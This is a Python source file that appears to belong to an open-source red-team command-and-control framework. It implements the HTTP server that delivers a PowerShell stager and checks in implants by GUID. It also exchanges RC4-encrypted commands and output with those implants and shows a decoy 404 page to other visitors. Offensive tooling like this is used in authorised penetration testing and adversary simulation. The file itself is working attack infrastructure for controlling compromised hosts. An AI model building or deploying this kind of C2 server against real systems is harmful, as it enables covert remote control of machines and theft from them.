"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/httpd.py
"""
import BaseHTTPServer
import base64
import ssl
import json
import uuid
import threading
from core.log import Log
from core.ui import UI
from core.rc4 import RC4
from core.parser import HTTPDParser
from core.utils import Utils
from core.apis import ServerApi

def HTTPDFactory(config):

    class HTTPD(BaseHTTPServer.BaseHTTPRequestHandler, object):
        def __init__(self, *args, **kwargs):
            self.config = config
            self.server_version = self.config.get("http-server")
            self.sys_version = ""
            self.rc4 = RC4(self.config.get("encryption-key"))
            self.db = self.config.get("redis")
            self.output = ""

            super(HTTPD, self).__init__(*args, **kwargs)

        def set_http_headers(self, force_download = False):
            self.send_response(200)
            if force_download:
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", 'attachment; filename="%s"' % self.path.rsplit("/", 1)[1])
            else:
                self.send_header("Content-Type", "text/html")
            self.end_headers()

        def set_json_header(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()

        def do_POST(self):
            if self.path.split("/")[1] == "api":
                server_api = ServerApi(self.config, self)
                self.output = server_api.process()
                self.return_json()
                return

            guid = ""
            try:
                guid = Utils.validate_guid(self.path.split('?', 1)[1])
            except:
                Log.log_error("Invalid request no GUID", self.path)
                self.return_data()
                return

            if not guid == None:
                self.db.update_checkin(guid)

                length = 0
                if not self.headers.getheader("Content-Length") == None:
                    length = int(self.headers.getheader("Content-Length"))
                data = self.rfile.read(length)
                try:
                    # for now we discard the UUID
                    data = json.loads(data)["data"]
                    data = self.rc4.crypt(base64.b64decode(data))
                except:
                    Log.log_error("Invalid base64 data received", self.path)
                    self.return_data()
                    return

                parser = HTTPDParser(config)
                self.output = base64.b64encode(self.rc4.crypt(parser.parse_cmd(guid, data)))
                self.output = json.dumps({"ID": str(uuid.uuid4()), "data": self.output})
            else:
                self.output = Utils.load_file("html/%s" % self.config.get("http-default-404"))

            self.return_data()

        def do_GET(self):
            force_download = False
            if self.path.split("/")[1] == "api":
                server_api = ServerApi(self.config, self)
                self.output = server_api.process()
                self.return_json()
                return

            path = self.path.split("/")[-1]
            if path == self.config.get("http-download-path"):
                Log.log_event("Download Stager", "PowerShell stager was fetched from %s (%s)" % (self.client_address[0], self.address_string()))
                self.output = Utils.load_powershell_script("stager.ps1", 56)
            elif path in Utils.get_download_folder_content():
                force_download = True
                self.output = Utils.load_file("download/%s" % path)
                Log.log_event("Download File", "%s was downloaded from %s (%s)" % (path, self.client_address[0], self.address_string()))
            else:
                self.output = Utils.load_file("html/%s" % self.config.get("http-default-404"))
                Log.log_error("Invalid request got a GET request", self.path)
            self.return_data(force_download)

        def return_data(self, force_download = False):
            self.set_http_headers(force_download)
            self.wfile.write(self.output)

        def return_json(self):
            self.set_json_header()
            self.wfile.write(self.output)

        def log_message(self, format, *args):
            Log.log_http_request(self.client_address[0], self.address_string(), args[0])
            return

    return HTTPD

def init_httpd_thread(config):
    thread = threading.Thread(target=start_httpd, args=(config,))
    thread.start()
    return thread

def start_httpd(config):
    ip = config.get("http-host")
    port = int(config.get("http-port"))

    print "\r\n"
    UI.success("Starting web server on %s port %d" % (ip, port))

    server_class = BaseHTTPServer.HTTPServer
    factory = HTTPDFactory(config)
    httpd_server = server_class((ip, port), factory)
    if config.get("https-enabled") == "on":
        cert = config.get("https-cert-path")
        Utils.file_exists(cert, True)

        httpd_server.socket = ssl.wrap_socket(httpd_server.socket, certfile=cert)
        UI.success("Web server is using HTTPS")

    httpd_server.serve_forever()
